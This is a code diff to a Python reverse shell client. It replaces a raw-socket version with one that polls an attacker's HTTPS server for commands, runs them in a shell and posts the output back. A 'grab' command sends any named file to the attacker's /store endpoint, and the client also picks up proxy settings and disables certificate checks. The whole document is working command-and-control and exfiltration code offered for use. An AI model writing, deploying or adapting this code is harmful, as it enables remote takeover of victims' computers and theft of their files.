@@ -1,151 +1,122 @@
-import socket
-import os
+from urllib import request, parse
 import subprocess
+import time
+import os
+from http.client import RemoteDisconnected
 import ssl
-import re
-import tqdm
+import platform
 
-SERVER_HOST = '192.168.18.128'
-SERVER_PORT = 8000
-BUFFER_SIZE = 1440  # max size of messages
-SEPARATOR = "<sep>"  # separator string for sending 2 messages in one go
+ATTACKER_IP = '192.168.1.41'  # Change this to the attacker's IP address
+HTTPS_PORT = 8443  # Change this to the HTTPS port if needed
 
-class Client:
+# Function to detect the OS and check for proxy settings
+def get_proxy_settings():
+    os_type = platform.system()
+    proxy = None
+
+    if os_type == "Windows":
+        # Check for proxy settings in the environment variables
+        proxy = os.getenv('HTTP_PROXY') or os.getenv('http_proxy')
+    elif os_type == "Linux" or os_type == "Darwin":  # Darwin is macOS
+        # Check for proxy settings in the environment variables
+        proxy = os.getenv('http_proxy') or os.getenv('https_proxy')
     
-    def __init__(self, host, port, verbose=False):
-        self.host = host
-        self.port = port
-        self.verbose = verbose
-        self.socket = self.connect_to_server()
-        self.cwd = None
+    return proxy
 
-    def connect_to_server(self, custom_port=None):
-        s = socket.socket()
-        if custom_port:
-            port = custom_port
-        else:
-            port = self.port
-        if self.verbose:
-            print(f"Connecting to {self.host}:{port}")
-        s.connect((self.host, port))
-        if self.verbose:
-            print("Connected.")
-
-        # Create an SSL context
-        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-        context.check_hostname = False  # Disable hostname checking
-        context.verify_mode = ssl.CERT_NONE  # Disable certificate verification
-
-        # Wrap the socket with SSL
-        s = context.wrap_socket(s, server_hostname=self.host)
+# Data is a dict
+def send_post(data, url, verify_ssl=False, proxy=None):   # True
+    data = {"rfile": data}
+    data = parse.urlencode(data).encode()
+    req = request.Request(url, data=data)
     
-        return s
+    # Create an SSL context
+    context = ssl.create_default_context()
     
-    def start(self):
-        self.cwd = os.getcwd()
-        self.socket.send(self.cwd.encode())
-        
-        while True:
-            command = self.socket.recv(BUFFER_SIZE).decode()
-            output = self.handle_command(command)
-            if output == "abort":
-                break
-            elif output in ["exit", "quit"]:
-                continue
-            self.cwd = os.getcwd()
-            message = f"{output}{SEPARATOR}{self.cwd}"
-            self.socket.sendall(message.encode())
-            
-        self.socket.close()
+    # If verify_ssl is False, disable certificate verification
+    if not verify_ssl:
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
 
-    def handle_command(self, command):
-        if self.verbose:
-            print(f"Executing command: {command}")
-        if command.lower() in ["exit", "quit"]:
-            output = "exit"
-        elif command.lower() == "abort":
-            output = "abort"
-        elif (match := re.search(r"cd\s*(.*)", command)):
-            output = self.change_directory(match.group(1))
-        elif (match := re.search(r"download\s*(.*)", command)):
-            filename = match.group(1)
-            if os.path.isfile(filename):
-                output = f"The file {filename} is sent."
-                self.send_file(filename)
-            else:
-                output = f"The file {filename} does not exist"
-        elif (match := re.search(r"upload\s*(.*)", command)):
-            filename = match.group(1)
-            output = f"The file {filename} is received."
-            self.receive_file()
-        else:
-            output = subprocess.getoutput(command)
-        return output
-    
-    def change_directory(self, path):
-        if not path:
-            return ""
+    # Set proxy if available
+    if proxy:
+        proxy_handler = request.ProxyHandler({'http': proxy, 'https': proxy})
+        opener = request.build_opener(proxy_handler)
+        request.install_opener(opener)
+
+    try:
+        request.urlopen(req, context=context)  # Send request
+    except (request.URLError, request.HTTPError, RemoteDisconnected) as e:
+        print(f"Error sending data: {e}")
+        print("Connection closed, exiting...")
+        exit(1)
+
+def send_file(command, proxy=None):
+    try:
+        grab, path = command.strip().split(' ')
+    except ValueError:
+        send_post("[-] Invalid grab command (maybe multiple spaces)", url=f'https://{ATTACKER_IP}:{HTTPS_PORT}/store', verify_ssl=True, proxy=proxy)
+        return
+
+    if not os.path.exists(path):
+        send_post("[-] Not able to find the file", url=f'https://{ATTACKER_IP}:{HTTPS_PORT}/store', verify_ssl=True, proxy=proxy)
+        return
+
+    store_url = f'https://{ATTACKER_IP}:{HTTPS_PORT}/store'  # Posts to /store
+    with open(path, 'rb') as fp:
         try:
-            os.chdir(path)
-        except FileNotFoundError as e:
-            output = str(e)
-        else:
-            output = ""
-        return output
-    
-    def receive_file(self, port=5002):
-        s = self.connect_to_server(custom_port=port)
-        Client._receive_file(s, verbose=self.verbose)
-        
-    def send_file(self, filename, port=5002):
-        s = self.connect_to_server(custom_port=port)
-        Client._send_file(s, filename, verbose=self.verbose)
-    
-    @classmethod
-    def _receive_file(cls, s: socket.socket, buffer_size=4096, verbose=False):
-        received = s.recv(buffer_size).decode()
-        filename, filesize = received.split(SEPARATOR)
-        filename = os.path.basename(filename)
-        filesize = int(filesize)
-        if verbose:
-            progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
-        else:
-            progress = None
-        with open(filename, "wb") as f:
-            while True:
-                bytes_read = s.recv(buffer_size)
-                if not bytes_read:
-                    break
-                f.write(bytes_read)
-                if verbose:
-                    progress.update(len(bytes_read))
-        s.close()
-    
-    @classmethod
-    def _send_file(cls, s: socket.socket, filename, buffer_size=4096, verbose=False):
-        filesize = os.path.getsize(filename)
-        s.send(f"{filename}{SEPARATOR}{filesize}".encode())
-        if verbose:
-            progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
-        else:
-            progress = None
-        with open(filename, "rb") as f:
-            while True:
-                bytes_read = f.read(buffer_size)
-                if not bytes_read:
-                    break
-                s.sendall(bytes_read)
-                if verbose:
-                    progress.update(len(bytes_read))
-        s.close()
+            send_post(fp.read(), url=store_url, verify_ssl=False, proxy=proxy)  # True
+        except (request.URLError, request.HTTPError, RemoteDisconnected) as e:
+            print(f"Error sending file: {e}")
+            print("Connection closed, exiting...")
+            exit(1)
 
-if __name__ == "__main__":
-     while True:
-         # keep connecting to the server forever
-         try:
-             client = Client(SERVER_HOST, SERVER_PORT, verbose=False) #if True print statement, if False without statement
-             client.start()
-         except Exception as e:
-             print(e)
-    #client = Client(SERVER_HOST, SERVER_PORT)
-    #client.start()
+def run_command(command, proxy=None):
+    CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+    send_post(CMD.stdout.read(), url=f'https://{ATTACKER_IP}:{HTTPS_PORT}', verify_ssl=False, proxy=proxy)  # True
+    send_post(CMD.stderr.read(), url=f'https://{ATTACKER_IP}:{HTTPS_PORT}', verify_ssl=False, proxy=proxy)  # True
+
+def connect_to_https_server(verify_ssl=False, proxy=None):  # True
+    # Create an SSL context
+    context = ssl.create_default_context()
+    
+    # If verify_ssl is False, disable certificate verification
+    if not verify_ssl:
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+
+    # Set proxy if available
+    if proxy:
+        proxy_handler = request.ProxyHandler({'http': proxy, 'https': proxy})
+        opener = request.build_opener(proxy_handler)
+        request.install_opener(opener)
+
+    # Try connecting to the HTTPS server
+    try:
+        command = request.urlopen(f"https://{ATTACKER_IP}:{HTTPS_PORT}", context=context).read().decode()
+        return command
+    except (request.URLError, request.HTTPError, RemoteDisconnected) as e:
+        print(f"Error connecting to HTTPS server: {e}")
+        return None
+
+# Get proxy settings
+proxy = get_proxy_settings()
+
+# Example of how to use the modified function
+while True:
+    command = connect_to_https_server(verify_ssl=False, proxy=proxy)  # True
+    
+    # If connection fails
+    if command is None:
+        print("HTTPS server is down, exiting...")
+        exit(1)
+
+    if 'terminate' in command:
+        break
+
+    # Send file
+    if 'grab' in command:
+        send_file(command, proxy=proxy)
+        continue
+
+    run_command(command, proxy=proxy)
+    time.sleep(1)
